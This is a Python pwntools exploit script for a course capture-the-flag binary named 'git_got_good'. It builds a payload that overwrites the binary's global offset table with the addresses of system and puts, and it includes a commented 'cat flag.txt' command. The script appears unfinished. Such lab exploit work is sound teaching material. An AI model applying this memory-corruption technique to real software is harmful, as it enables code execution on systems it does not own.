#import from py
import re

#outside imports
from pwn import *


#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1341
netid='pk1898'

context.log_level ='debug'
do_remote = False
binary_name = './git_got_good'
e = ELF('./git_got_good')

#for doing local debugging
is_local_dbg = True
gdb_script = '''
set follow-fork-mode parent
set detach-on-fork on
b main
b fgets
b puts
b *0x4007de
c
'''

#universal flag finder, given a string
def find_flag(input):
    m = re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return


def solve(target):
    print target.recvuntil("save:")
    DATA = ''
    # DATA += p64(e.got['system'])
    DATA += p64(e.got['system'])
    DATA += 'AAAAAAAA'
    DATA += p64(e.got['puts'])

    print DATA

    #DATA += p64(0x004005d0)
    #DATA = p64(0x004007a8)
    #DATA += "cat flag.txt"
    #DATA = "hi"
    print target.send(DATA)
    print target.readline()
    #target.sendline('cat flag.txt')
    target.interactive()


#universal target setup for remote-only
def target():
    if(do_remote):
        r = remote(host, port)
        r.sendline(netid)
        r.recvline() # eat interstitial
        return r
    else:
        if(is_local_dbg):
            target = gdb.debug(binary_name, gdb_script)
        else:
            target = process(binary_name)
        return target

#scaffolding
def main():
    with target() as p:
        flag = solve(p)
    if(flag):
        print "Challenge Solved: %s" % flag
    else:
        print "Challenge Not Solved"

if __name__ == '__main__':
    main()
